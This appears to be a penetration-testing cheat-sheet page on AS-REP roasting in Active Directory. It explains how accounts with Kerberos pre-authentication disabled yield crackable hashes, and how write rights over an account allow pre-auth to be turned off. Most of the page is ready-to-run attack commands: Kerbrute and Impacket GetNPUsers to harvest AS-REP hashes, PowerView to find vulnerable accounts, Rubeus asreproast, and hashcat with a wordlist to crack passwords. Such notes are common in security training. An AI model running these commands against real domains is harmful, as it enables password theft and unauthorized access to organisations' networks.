# ASREProasting

## <mark style="color:yellow;">ABOUT</mark>

Usually in Kerberos protocol, we are sending timestamp, encrypted with our password's hash, KDC checks it and if it's true, it sends us TGT. But with <mark style="color:yellow;">**Pre-Auth turned OFF**</mark> it works different (like in old Kerberos versions): We can just ask for TGT, and if we are decrypted it with our password, we are allowed in.&#x20;

So in <mark style="color:red;">**AS-REProasting**</mark>**&#x20;**<mark style="color:purple;">**we need to**</mark> <mark style="color:purple;">**look for account with Pre-Auth turned OFF**</mark>, so we can ask for TGT, so we can try to crack AS-REP request to get password.

> Also if we have <mark style="color:green;">`GenericWrite`</mark> or <mark style="color:green;">`GenericAll`</mark> rights over account, but we don't know it's password, we could make it turn-off Pre-Auth, crack it, and get the password.

## <mark style="color:yellow;">LINUX</mark>

#### Hashcat AS-REP Crack

```bash
hashcat -m 18200 militech_asrep /usr/share/wordlists/rockyou.txt
```

#### Kerbrute AS-REP Retrieve

> Kerbrute will automatically get AS-REP's for users which do not have pre-auth

```bash
kerbrute userenum -d militech.local --dc 13.13.13.13 /opt/jsmith.txt --hash-file
```

#### Impacket's GetNPUsers

```bash
GetNPUsers.py MILITECH.LOCAL/ -dc-ip 13.13.13.13 -no-pass -usersfile valid_ad_users 
```

## <mark style="color:yellow;">WINDOWS</mark>

#### PowerView Check

```powershell
PS C:\> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

#### Rubeus ASREProasting

```powershell
PS C:\> .\Rubeus.exe asreproast /user:sreed /nowrap /format:hashcat
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/asreproast#asreproast" %}

{% embed url="https://blog.harmj0y.net/activedirectory/roasting-as-reps/" %}
